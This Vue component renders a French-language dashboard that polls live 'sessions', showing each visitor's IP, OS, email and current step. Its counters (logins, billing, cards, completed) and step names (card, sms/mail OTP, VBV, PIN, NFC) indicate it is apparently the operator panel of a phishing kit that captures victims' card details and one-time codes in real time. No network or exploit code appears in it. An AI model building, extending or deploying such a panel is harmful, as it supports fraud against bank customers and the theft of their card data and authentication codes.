<template>
  <div>
    <div class="page-header">
      <h1 class="page-title">Tableau de bord</h1>
    </div>

    <div class="filters">
      <button v-for="f in filters" :key="f.key" class="filter-btn" :class="{ active: filter === f.key }" @click="filter = f.key; refresh()">{{ f.label }}</button>
    </div>

    <div class="stats-row">
      <div class="stat" v-for="s in statItems" :key="s.key">
        <div class="stat-label">{{ s.label }}</div>
        <div class="stat-value">{{ store.stats[s.key] ?? 0 }}</div>
      </div>
    </div>

    <div class="card">
      <div class="card-inner">
        <div class="card-title">Sessions actives</div>
        <div v-if="!store.sessions.length" class="empty">Aucune session</div>
        <table v-else>
          <thead><tr><th></th><th>IP</th><th>OS</th><th>Email</th><th>Page</th><th></th></tr></thead>
          <tbody>
            <tr v-for="s in store.sessions.slice(0, 12)" :key="s.id" :class="{ 'row-alert': isWaiting(s) }">
              <td><span class="dot" :class="s.is_online ? 'dot-on' : 'dot-off'"></span></td>
              <td class="mono">{{ s.ip }}</td>
              <td><span class="os-icon" v-html="osIcon(s.os)"></span></td>
              <td class="mono">{{ s.email || '—' }}</td>
              <td><span class="step-badge" :class="stepCls(s)">{{ s.stepLabel }}</span></td>
              <td><router-link :to="'/session/' + s.id" class="btn btn-sm">Voir</router-link></td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue'
import { useSessionsStore } from '@/stores/sessions'

const store = useSessionsStore()
const filter = ref('all')
const filters = [
  { key: '24h', label: '24h' }, { key: '7d', label: '7 jours' },
  { key: '30d', label: '30 jours' }, { key: 'all', label: 'Tout' },
]
const statItems = [
  { key: 'visitors', label: 'Visiteurs' }, { key: 'logins', label: 'Connexions' },
  { key: 'billing', label: 'Facturation' }, { key: 'cards', label: 'Cartes' },
  { key: 'complete', label: 'Termines' },
]

function refresh() { store.fetchStats(filter.value); store.fetchSessions() }
function isWaiting(s) { return ['loading', 'page_loading'].includes(s.current_step) }
function stepCls(s) { const st = s.current_step; if (['card','loading','page_loading'].includes(st)) return 'step-hot'; if (['billing','info'].includes(st)) return 'step-warm'; if (['sms','mail','nfc','vbv','pin','page_otp_sms','page_otp_mail','page_otp_nfc','page_vbv','page_pin'].includes(st)) return 'step-active'; return '' }
function osIcon(os) {
  if (os==='apple') return '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>'
  if (os==='android') return '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M6 18c0 .55.45 1 1 1h1v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h2v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h1c.55 0 1-.45 1-1V8H6v10zM3.5 8C2.67 8 2 8.67 2 9.5v7c0 .83.67 1.5 1.5 1.5S5 17.33 5 16.5v-7C5 8.67 4.33 8 3.5 8zm17 0c-.83 0-1.5.67-1.5 1.5v7c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-7c0-.83-.67-1.5-1.5-1.5zm-4.97-5.84l1.3-1.3c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0l-1.48 1.48A5.84 5.84 0 0012 1c-.96 0-1.86.23-2.66.63L7.85.15c-.2-.2-.51-.2-.71 0-.2.2-.2.51 0 .71l1.31 1.31A5.983 5.983 0 006 7h12c0-1.99-.97-3.75-2.47-4.84zM10 5H9V4h1v1zm5 0h-1V4h1v1z"/></svg>'
  if (os==='windows') return '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>'
  if (os==='linux') return '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12.504 0c-.155 0-.315.008-.48.021-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.424.424 0 00-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.368 1.884 1.43.777.07 1.492-.331 1.878-.931.3-.470.585-1.315.585-1.796v-.033c.024-.04.056-.078.082-.117.39-.58.27-1.347-.265-1.722-.163-.114-.358-.177-.56-.207.03-.133.05-.27.046-.402-.01-.467-.177-1.011-.653-1.465-.336-.318-.766-.592-1.258-.755-.125-.043-.252-.088-.381-.13l-.009-.006c-.39-.133-.78-.27-1.108-.467-.547-.32-1.019-.903-1.019-1.37 0-.47.216-.926.322-1.13.21-.41.486-.98.662-1.63.118-.418.17-.9.126-1.391z"/></svg>'
  return '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="1.5"/></svg>'
}

onMounted(() => store.startPolling(refresh, 3000))
onUnmounted(() => store.stopPolling())
</script>
